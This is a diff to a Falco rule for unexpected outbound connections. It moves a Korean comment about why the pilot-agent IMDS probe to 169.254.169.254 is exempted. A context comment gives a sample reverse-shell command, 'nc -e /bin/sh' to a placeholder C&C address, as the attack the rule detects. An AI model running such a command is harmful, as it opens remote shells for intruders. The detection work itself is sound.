@@ -164,6 +164,7 @@ falco:
       # 주의: 노이즈가 많을 수 있으니 초기엔 NOTICE로 설정, 튜닝 필요
       # 정상 시나리오: DB(3306), 내부 API(8080), HTTPS(443) 연결
       # 악의적 시나리오: 해커 C&C 서버로 역쉘 연결 (nc -e /bin/sh 1.2.3.4 4444)
+      # pilot-agent IMDS 프로브(169.254.169.254) 예외: namespace=<NA> enrichment 딜레이 보완
       - rule: Unexpected Outbound Connection
         desc: Detect outbound connections to uncommon ports (potential C&C or reverse shell)
         condition: >
@@ -176,9 +177,6 @@ falco:
           not container.image.repository in (moby/buildkit) and
           not container.name in (mysql-exporter) and
           not proc.name in (helm, git) and
-          # Why: pilot-agent가 기동 시 클라우드 플랫폼 자동 감지(IMDS 프로브)로 169.254.169.254에
-          #      접근하는 것은 Istio 정상 동작. namespace=<NA>(enrichment 딜레이)로 istio-system
-          #      예외가 우회되는 경우를 보완 (runtime.md 오탐 목록 2026-03-20)
           not (proc.name = "pilot-agent" and fd.sip = "169.254.169.254")
         output: >
           🔵 NOTICE: 예상치 못한 외부 연결 시도 감지
